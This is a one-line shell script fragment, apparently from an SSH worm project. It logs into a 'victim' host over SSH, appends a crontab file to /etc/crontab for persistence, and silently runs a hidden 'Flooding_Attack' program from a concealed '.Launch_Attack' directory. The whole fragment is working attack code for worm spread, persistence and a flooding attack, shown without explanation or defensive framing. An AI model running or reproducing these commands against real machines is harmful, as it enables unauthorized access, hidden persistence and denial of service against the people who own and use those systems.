...
ssh -t victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; (sudo chmod +w /etc/crontab) || (sudo echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab); cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
